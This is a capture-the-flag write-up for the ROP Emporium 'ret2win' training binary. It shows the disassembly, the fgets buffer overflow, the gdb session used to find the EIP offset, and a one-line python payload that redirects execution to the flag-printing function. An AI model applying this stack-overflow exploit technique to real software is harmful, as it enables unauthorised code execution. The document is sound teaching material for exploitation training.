# RET2WIN Writeup

## 32bit

Disassemble the binary (use IDA, binary ninja or WYL) and inspect
the code section (.text part)

```bash
objdump -d ret2win32
```

Start by analyzing the asm looking for an entry point for the exploit
which, in this case, is represented by a vulnerable buffer.
Indeed, _pwnme_ allocates a 32byte buffer (0x20) which is then passed as
parameter to fgets but with the wrong size, 50 (0x32).
This vuln buf manipulated by the __fgets__ call in the __pwnme__ function
can be exploited.

```bash
080485f6 <pwnme>:
 80485f6:   55                      push   %ebp
 80485f7:   89 e5                   mov    %esp,%ebp
 80485f9:   83 ec 28                sub    $0x28,%esp
 80485fc:   83 ec 04                sub    $0x4,%esp
 80485ff:   6a 20                   push   $0x20
 8048601:   6a 00                   push   $0x0
 8048603:   8d 45 d8                lea    -0x28(%ebp),%eax
 8048606:   50                      push   %eax
 8048607:   e8 54 fe ff ff          call   8048460 <memset@plt>
 804860c:   83 c4 10                add    $0x10,%esp
 804860f:   83 ec 0c                sub    $0xc,%esp
 8048612:   68 3c 87 04 08          push   $0x804873c
 8048617:   e8 04 fe ff ff          call   8048420 <puts@plt>
 804861c:   83 c4 10                add    $0x10,%esp
 804861f:   83 ec 0c                sub    $0xc,%esp
 8048622:   68 bc 87 04 08          push   $0x80487bc
 8048627:   e8 f4 fd ff ff          call   8048420 <puts@plt>
 804862c:   83 c4 10                add    $0x10,%esp
 804862f:   83 ec 0c                sub    $0xc,%esp
 8048632:   68 21 88 04 08          push   $0x8048821
 8048637:   e8 c4 fd ff ff          call   8048400 <printf@plt>
 804863c:   83 c4 10                add    $0x10,%esp
 804863f:   a1 60 a0 04 08          mov    0x804a060,%eax
 8048644:   83 ec 04                sub    $0x4,%esp
 8048647:   50                      push   %eax
 8048648:   6a 32                   push   $0x32
 804864a:   8d 45 d8                lea    -0x28(%ebp),%eax
 804864d:   50                      push   %eax
 804864e:   e8 bd fd ff ff          call   8048410 <fgets@plt>
 8048653:   83 c4 10                add    $0x10,%esp
 8048656:   90                      nop
 8048657:   c9                      leave
 8048658:   c3                      ret
```

Looking at other functions in the disassembled binary we see ret2win.
This function contains a call to __system__, which executes the command passed
as parameter. Here we can see the address _0x8048841_ pushed on the stack
before calling system (passed as param).
So, we are interested in figuring out what this address contains.

Using rabin2 (binary inspector) it is possible to grep the different sections
of the ELF file.

```bash
rabin2 -z ret2win32
```

prints the strings contained in the .data segment of the binary and their
virtual addresses, which we are interested in.

```bash
vaddr=0x08048710 paddr=0x00000710 ordinal=000 sz=24 len=23 section=.rodata type=ascii string=ret2win by ROP Emporium
vaddr=0x08048728 paddr=0x00000728 ordinal=001 sz=8 len=7 section=.rodata type=ascii string=32bits\n
vaddr=0x08048730 paddr=0x00000730 ordinal=002 sz=9 len=8 section=.rodata type=ascii string=\nExiting
vaddr=0x0804873c paddr=0x0000073c ordinal=003 sz=126 len=125 section=.rodata type=ascii string=For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?
vaddr=0x080487bc paddr=0x000007bc ordinal=004 sz=101 len=100 section=.rodata type=ascii string=You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n
vaddr=0x08048824 paddr=0x00000824 ordinal=005 sz=29 len=28 section=.rodata type=ascii string=Thank you! Here's your flag:
vaddr=0x08048841 paddr=0x00000841 ordinal=006 sz=18 len=17 section=.rodata type=ascii string=/bin/cat flag.txt
```
We can see the last vaddr matches with the following string:

_/bin/cat flag.txt_

which prints the content of flag.txt to stdout.

Since the __ret2win__ function already
prints the flag we are searching for, we just need to overflow the buffer
until reaching EIP then overwrite its value with the address of ret2win
function.

We can inspect the execution state of pwnme trying
to figure out which is the right num of bytes needed to overflow the buffer and
overwrite the EIP.
Since we are attacking a 32bit binary, the size of each address is 4 bytes.
So we craft a string composed by different chunks of 4 bytes.

```bash
for i in `seq 0 77`;
do
   python -c 'from __future__ import print_function; import sys; print(str(unichr(48+int(sys.argv[1])))*4,end="")' $i;
done;

```
Then we use gdb to inspect the exec state of pwnme, injecting the probe string
and observing the state of the registers.

```bash
gdb -q ret2win32
Reading symbols from ret2win32...(no debugging symbols found)...done.
(gdb) break pwnme
Breakpoint 1 at 0x80485fc
(gdb) r
Starting program: /home/m/Downloads/ret2win32 
ret2win by ROP Emporium
32bits


Breakpoint 1, 0x080485fc in pwnme ()
(gdb) n
Single stepping until exit from function pwnme,
which has no line number information.
For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> 0000...}}}}
0x3b3b3b3b in ?? ()
(gdb) info all
eax            0xffffd170  -11920
ecx            0xf7f958a0  -134653792
edx            0xffffd170  -11920
ebx            0x0   0
esp            0xffffd1a0  0xffffd1a0
ebp            0x3a3a3a3a  0x3a3a3a3a
esi            0xf7f94000  -134660096
edi            0x0   0
eip            0x3b3b3b3b  0x3b3b3b3b
eflags         0x282 [ SF IF ]
...
```
EBP is smashed by "3a"*4a, the HEX code for ':'*4 and EIP is smashed by "3b"*4,
the HEX code for ';'*4

Jumping to ret2win function requires to overwrite EIP. We replace the
4 ';' chars in our string with the address of ret2win. To simplify, we just
use the same value for all the other chars which are needed to overflow the
buffer and remove the "extra" chars after ';'

```bash
python -c 'print "A"*44+"\x59\x86\x04\x08"' | ./ret2win32
```

the address has been translated in little endian format cause Intel
processors use this format to store addresses in memory

## 64bit

The exploit is the same as the 32bit one. The only difference is in the size
of the addresses: use little_endian(0000000000400811) as ret2win vaddr
instead of the 32bit version.